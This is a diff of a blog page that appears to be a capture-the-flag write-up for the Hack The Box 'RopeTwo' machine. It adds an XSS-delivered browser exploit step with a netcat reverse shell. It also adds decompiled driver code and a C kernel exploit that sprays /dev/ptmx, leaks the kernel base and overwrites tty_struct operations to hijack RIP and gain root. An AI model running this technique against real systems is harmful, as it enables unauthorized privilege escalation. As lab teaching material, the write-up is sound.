@@ -430,21 +430,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-01-16
+                    2021-01-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    7.4k
+                    7.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    46 Min
+                    48 Min
                 </div>
                 
 
@@ -1059,7 +1059,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Spawning a shell..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="/img/ropetwo/foothold.png" alt></p>
+<p>Now, the obstacle was, where exactly are we supposed to submit the exploit to, there are no chrome instance running on any port, is there? But then, there was this <code>/contact</code> on the port 8000, at this point, I wasn’t sure much either, so knowing the comment kind of template might have the XSS vulnerability, this was the only way that seemed to make sense, so giving the exploit as <code>&lt;script&gt;exploit&lt;/script&gt;</code> in the message body and having our netcat listener waiting for the connection, we get the shell as <code>chromeuser</code><br><img src="/img/ropetwo/foothold.png" alt></p>
 <h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><p>After getting the foothold on the machine as <code>chromeuser</code>, looking over in the <code>/home</code> folder there were two directories which include <code>r4j</code> and <code>chromeuser</code> and since the <code>/home/chromeuser</code> didn’t had <code>user.txt</code> or anything else that would hint towards something, I started doing the basic enumeration for finding the SUID binaries, which showed the following binaries:-</p>
 <p><img src="/img/ropetwo/ssh.png" alt></p>
 <pre class=" language-r"><code class="language-r">chromeuser<span class="token operator">@</span>rope2<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>null
@@ -1503,8 +1503,285 @@ p.interactive()</code></pre>
 <p>Issue, after getting the shell as the user <code>r4j</code>, I couldn’t read the <code>user.txt</code> which was because of the groups I belonged, using the <code>newgrp</code> and leveraging to the <code>r4j</code> group, I was able to read the user flag.</p>
 </blockquote>
 <p><img src="/img/ropetwo/user.png" alt></p>
-<p>Now, being the user <code>r4j</code> didn’t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>.</p>
-<p>The files for root exploitation can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root" target="_blank" rel="noopener">here</a>.</p>
+<h1 id="Root-Kernel-Exploitation"><a href="#Root-Kernel-Exploitation" class="headerlink" title="Root: Kernel Exploitation"></a>Root: Kernel Exploitation</h1><p>Now, being the user <code>r4j</code> didn’t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the <code>/dev/</code> to look for any suspicious driver, in this case the only thing that stood out more than the other was, <code>ralloc</code>. </p>
+<blockquote>
+<p>Attachment: The files for root exploitation can be found <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root" target="_blank" rel="noopener">here</a>.</p>
+</blockquote>
+<p>One way I found about the <code>ralloc</code> custom LKM was with the help of <code>dmesg</code>, which showed the follwing message:-</p>
+<p><img src="/img/ropetwo/dmesg.png" alt></p>
+<p>Now, that showed, we have the <code>ralloc</code>, although to start off with the exploitation or even knowing the workflow of this module, I needed to get the <code>ralloc.ko</code>, doing <code>locate ralloc.ko</code>, the file was located at <code>/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko</code> which is the default path where kernel modules are stored. Then checking for the kernel version:-</p>
+<pre class=" language-C"><code class="language-C">Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+<p>There was no publically available CVE for this version of kernel, what left was to dissect the binary and try to understand the workflow and look for any vulnerable part. I am more fan of IDA than of Ghidra, but then again it’s just personal preference, at the end you’ll have the overall idea. So, moving on, let’s reverse engineer the binary and see what the binary really does:-</p>
+<p>Now, using the <code>IDA</code> and cleaning up the code a lot, there were 3 functions, in which the <code>rope2_ioctl</code> was one of the functions which was most interesting, the other 2 being <code>rope2_init</code> and <code>rope2_exit</code> are there to handle the intialization and exit operation for the modules, aside from those, the function we need to really focus on was the <code>rope2_ioctl</code> which was as follows:-</p>
+<p>First off, there were four options one could invoke, which were as follows:-</p>
+<pre class=" language-C"><code class="language-C">    case 0x1000:
+      heap.size = *&request.size;
+      if ( *&request.size <= 0x400uLL && request.index <= 0x1F )
+      {
+        heap.chunk = (&arr + 16 * request.index);
+        if ( !heap.chunk[1] )
+        {
+          chunk = _kmalloc(*&request.size, 0x6000C0LL);
+          heap.chunk[1] = chunk;
+          if ( chunk )
+          {
+            *heap.chunk = heap.size + 32;
+            return_value = 0LL;
+            goto exit;
+          }
+        }
+      }
+      goto jump_to_exit;</code></pre>
+<p>The first option, here which can be invoked by giving the <code>0x1000</code> as option, which we will see later on how we will interact with it, here it takes the two options, <code>index</code> and the other being <code>size</code> on the basis of that, it will allocate the chunk on the kernel heap with the <code>kmalloc</code> and save it on the global array with the index given, the upmost <code>index</code> that we could allocate to is <code>0x1F</code> and accepted size is <code>&lt;= 0x400</code>.</p>
+<pre class=" language-C"><code class="language-C">    case 0x1001:
+      if ( request.index <= 0x1F )
+      {
+        index = 2LL * request.index;
+        array_1 = &arr + index * 8;
+        if ( heap_list[index] )
+        {
+          kfree();
+          *(array_1 + 1) = 0LL;
+          return_value = 0LL;
+          goto exit;
+        }
+      }
+      goto jump_to_exit;</code></pre>
+<p>The option <code>0x1001</code> here is used to invoke a function which only takes <code>index</code> as the option and then checks if the index exist or not, on the basis of that it calls <code>kfree</code> and release the allocated chunk.</p>
+<pre class=" language-C"><code class="language-C">    case 0x1002:
+      heap2.chunk = request.buf;
+      if ( request.index <= 0x1F )
+      {
+        heap1.index = 2LL * request.index;
+        heap1.chunk = heap_list[heap1.index];
+        heap1.size = (&arr + heap1.index * 8);
+        if ( heap1.chunk )
+        {
+          memcpy_size = request.size;
+          if ( request.size <= *heap1.size && !(request.buf & 0xFFFF000000000000LL) )
+            goto memcpy_jump;
+        }
+      }
+jump_to_exit:
+      return_value = -1LL;
+      goto exit;
+  }</code></pre>
+<p>The option was used to write to an allocated region, it takes the <code>index</code>, the <code>size</code> and the pointer to the buffered region.</p>
+<pre class=" language-C"><code class="language-C">  if ( choice != 0x1003 )
+    goto jump_to_exit;
+  heap1.chunk = request.buf;
+  if ( request.index > 0x1F )
+    goto jump_to_exit;
+  heap2.index = 2LL * request.index;
+  heap2.chunk = heap_list[heap2.index];
+  heap2.size = (&arr + heap2.index * 8);
+  if ( !heap2.chunk )
+    goto jump_to_exit;
+  memcpy_size = request.size;
+  if ( *heap2.size < request.size || request.buf & 0xFFFF000000000000LL )
+    goto jump_to_exit;
+memcpy_jump:
+  memcpy(heap1.chunk, heap2.chunk, memcpy_size);
+  return_value = 0LL;
+exit:
+  mutex_unlock(&lock);
+  return return_value;
+}</code></pre>
+<p>This function was used to interact in order to read from the allocated region, this takes the <code>index</code>, <code>size</code> and the pointer to the buffer where the contents from the allocated region will be copied, this pointer would from the userland region.</p>
+<p>Summarsing the code, we conclude it to:-</p>
+<ul>
+<li><code>0x1000</code>: Allocate function which takes <code>index</code> and <code>size</code>.</li>
+<li><code>0x1001</code>: Free function which takes the <code>index</code>.</li>
+<li><code>0x1002</code>: Write function which takes the <code>index</code> <code>size</code> and <code>data</code> to be written.</li>
+<li><code>0x1003</code>: Read function which takes <code>index</code>, <code>size</code> and the <code>data</code> where the contents of the chunk would be read.</li>
+<li>We can only allocate chunks upto to <code>0x1F</code> times.</li>
+</ul>
+<p>So, where does the vulnerabilit exists? It exists in the function <code>0x1000</code> which is used for allocation, now let’s see where it was:-</p>
+<pre class=" language-C"><code class="language-C">         chunk = _kmalloc(*&request.size, 0x6000C0LL);
+          heap.chunk[1] = chunk;
+          if ( chunk )
+          {
+            *heap.chunk = heap.size + 32;
+            return_value = 0LL;
+            goto exit;</code></pre>
+<p>The structure of the <code>heap</code> can be considered as:</p>
+<pre class=" language-C"><code class="language-C">struct heap {
+  int size;
+  char *buf;
+}  // This is not accurate, it's here just for the explaination</code></pre>
+<p>If you pay close attention to the <code>heap.size + 32</code>, well considering how the <code>heap</code> structure here is, there’s an extra 32 bytes added to it. This in turn, allowed us to write 32 bytes more than size of an allocated chunk, same as for read, we can read extra 32 bytes than the chunk’s actual size.<br>So, conlcuding, we have <strong>32</strong> byte extra overflow for read/write. Now, the question arises, how exactly we interact with the service, to do so, I used <code>ioctl</code> to interact with it, the following functions I created:-</p>
+<pre class=" language-C"><code class="language-C">struct message {
+  unsigned int index;
+  long size;
+  char *buf;
+};
+
+
+void kmalloc(int fd, unsigned long idx, unsigned long size)
+{
+  struct message msg;
+  msg.size = size;
+  msg.index = idx;
+  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
+  if (ioctl(fd, 0x1000, &msg) == -1)
+  {
+   puts("Error!!");
+   exit(1);
+  }
+}
+
+void kfree(int fd, unsigned long idx)
+{
+ struct message msg;
+ msg.index = idx;
+ printf("[*] Free'ng index: %ld\n", idx);
+ if (ioctl(fd, 0x1001, &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+
+void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
+{
+ struct message msg;
+ msg.buf = ptr;
+ msg.index = idx;
+ msg.size = size;
+ printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
+ if (ioctl(fd, 0x1002,  &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+
+
+void get(int fd, unsigned long idx, unsigned long size, char *ptr)
+{
+ struct message msg;
+ msg.index = idx;
+ msg.size = size;
+ msg.buf = ptr;
+ printf("[*] Reading data from index: %ld\n", idx);
+   if (ioctl(fd, 0x1003, &msg) == -1)
+ {
+  puts("Error!!");
+  exit(1);
+ }
+}
+</code></pre>
+<p>For the experimentation, I made a QEMU instance of the Linux Kernel <code>5.0.-38</code> with the <code>ralloc.ko</code> as a module loaded to it upon starting, which I uploaded to the github, linked above, try it yourself. </p>
+<p>The question we end up at last at exactly how are we supposed to exploit this heap overflow which only gives us the extra 32 bytes to do read/write. Upon the extensive research, I found <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#tty_struct" target="_blank" rel="noopener">this blog post</a> by <a href="https://twitter.com/ptr-yudai" target="_blank" rel="noopener">ptr-yudai</a>, which if translated to the english stated as follows:-</p>
+<hr>
+<p><strong>Size</strong> : 0x2e0 (kmalloc-1024)<br><strong>base</strong> : <code>ops</code> the <code>ptm_unix98_ops</code> leak possible because it refers to. Besides that, it pointed to the data area of ​​the kernel in about two places.<br><strong>Heap</strong> : <code>dev</code>, driver<code>leak possible because like many of the object is pointing to the members of the heap and own. The target SLUB has not been investigated.
+**stack** : I can&#39;t seem to leak.
+**Secure** :</code>/dev/ptmx<code>Open.
+**Release** : Close the open</code>ptmx<code>.
+**Remarks** :</code>ops` RIP can be controlled by rewriting.<br><strong>Reference</strong> : <a href="https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283</a></p>
+<hr>
+<p>Considering the above, I then focused on a writeup wrote by the same author for the challenge he created, which can be found <a href="https://hackmd.io/@ptr-yudai/rJp1TpbBU" target="_blank" rel="noopener">here</a>, this if try to compare from the <code>ralloc</code>, the initial methodology seems to be same.</p>
+<p>Apparently, going in-depth on why this <code>/dev/ptmx</code> is the best target would be better for a seperate post itself, so I am leaving the unncessary part in this challenge context and will explain the things as we move on. To replicate the same methodology to get the RIP control, firstly I allocated a chunk of size <code>0x400</code> which was the meximun size the ioctl can allocate the chunk of and I also opened the <code>ptmx</code> device.</p>
+<p>I turned off the KASLR on the QEMU instance and already got the address of the function we needed:-</p>
+<ul>
+<li><code>commit_creds</code></li>
+<li><code>ptm_unix98_ops</code></li>
+<li><code>prepare_kernel_creds</code></li>
+</ul>
+<pre class=" language-C"><code class="language-C">int main() {
+  unsigned long buf[0x420 / sizeof(unsigned long)];
+  /* open drivers */
+  int fd = open("/dev/ralloc", O_RDONLY);
+  if (fd < 0) {
+    perror("/dev/ralloc");
+    return 1;
+  }
+
+  for(int i=0; i<0x100; i++)
+ {
+   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+ }
+
+
+  kmalloc(fd, 0, 0x400);
+  get(fd, 0, 0x420, &buf);
+  return 0;
+}</code></pre>
+<p>Now, doing so, upon setting up a breakpoint at the <code>rope2_ioctl</code>‘s <code>kmalloc</code> call and stepping to it, we see the heap structure as:-</p>
+<blockquote>
+<p>Note: Before debugging do: <code>add-symbol-file ralloc.ko 0xffffffffc0002000</code> in the <code>gdb-gef</code>.</p>
+</blockquote>
+<p>Then, moving on, setup a breakpoint at the <code>b *rope2_ioctl + 342</code> and then running the program, once it hits the breakpoint, when we see the memory:-</p>
+<p><img src="/img/ropetwo/kmalloc.png" alt></p>
+<p>Now, considering that, if we see for the memory content, the <code>ptm_unix98_ops</code> object was at <code>heap.size + 32</code>, since <code>heap.size</code> was <code>0x400</code>, the <code>ptm_uniz98_ops</code> was at the <code>0x420</code>. Using the <code>get</code> function, we can have the leak:-</p>
+<p><img src="/img/ropetwo/leak.png" alt></p>
+<p>Now, since we have a leak, this will be useful in retrieving the base address to calculate the address of the function and gadget we will need, for now, since the structure as defined, if we can overwrite the <code>*ops</code> with the help of the fake <code>tty_operations</code> array created from the userland, we can have the RIP control.</p>
+<blockquote>
+<p>The POC for <code>tty_struct</code> and RIP control can be understood from here: <a href="https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free(UAF)(feat.tty_struct)-PoCcode" target="_blank" rel="noopener">https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free(UAF)(feat.tty_struct)-PoCcode</a></p>
+</blockquote>
+<p>Now compiling the exploit:-</p>
+<pre class=" language-C"><code class="language-C">
+unsigned long kbase, kheap;
+unsigned long ptm_unix98_ops = 0x10af6a0;
+unsigned long pop_rdi, kpti;
+unsigned long init_creds = 0x165fa00;
+unsigned long commit_creds = 0xc0540;
+
+void *fake_tty_operations[30];
+
+int spray_fd[0x100];
+
+
+//[..snip..] 
+
+int main() {
+  unsigned long buf[0x420 / sizeof(unsigned long)];
+  /* open drivers */
+  int fd = open("/dev/ralloc", O_RDONLY);
+  if (fd < 0) {
+    perror("/dev/ralloc");
+    return 1;
+  }
+
+  for(int i=0; i<0x100; i++)
+ {
+   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+ }
+
+  kmalloc(fd, 0, 0x400);
+  get(fd, 0, 0x420, &buf);
+  kbase = buf[131] - ptm_unix98_ops;
+
+  printf("[*] Leak                :   %p\n", buf[131]);
+
+  if (buf[131] & 0xfff != 0x6a0)
+  {
+    printf("[!] Error, exploit failed.\n");
+    exit(-1);
+  }
+  printf("[*] Base                :   %p\n", kbase);
+  printf("[*] Gadget              :   %p\n", kbase + 0xb55c7);
+  commit_creds = kbase + commit_creds;
+  init_creds = kbase + init_creds;
+  pop_rdi = kbase + 0x8b8a0;      // pop rdi; ret
+  kpti = kbase + 0xc00a34;       // swapgs_restore_regs_and_return_to_usermode
+  printf("[*] init_creds:   %p\n", init_creds);
+  printf("[*] commit_creds        :   %p\n", commit_creds);
+  printf("[*] get_shell            :   %p\n", &get_shell);
+  printf("[!] DEBUG....:");
+  getchar();
+  fake_tty_operations[12] = 0xdeadbeef;
+  buf[131] = &fake_tty_operations;
+
+  fill(fd, 0, 0x420, &buf);
+  for(int i=0; i<0x100; i++)
+  {
+    ioctl(spray_fd[i], 0, 0);
+  }
+  return 0;
+}</code></pre>
+<p>Doing the above, we get the RIP overwritten as <code>0xdeadbeef</code>.</p>
+<p><img src="/img/ropetwo/deadbeef.png" alt></p>
 <p>I used the <code>tty_struct</code> as the allocation function of the <code>ralloc</code> device had a 32 byte overflow to the heap region which allowed me to overwrite the <code>ptm_unix98_ops</code> and replace it with a crafted <code>tty_struct</code>, hence, I overwrote the RIP with the <code>xchg eax, esp</code> and <code>mmap</code>‘d a chunk shared between the region, which had the payload stored, which did <code>prepare_kernel_cred(commit_cred(0))</code> which would leverage the privileges to the root and calling a userland function which did <code>system(&quot;/bin/sh&quot;)</code>, compiling the exploit as <code>gcc -static -masm=intel xploit.c -o xploit</code> .</p>
 <p><img src="/img/ropetwo/root.png" alt></p>
 
@@ -1981,7 +2258,7 @@ p.interactive()</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.6k</span>&nbsp;字
+                class="white-color">44.9k</span>&nbsp;字
             
             
             
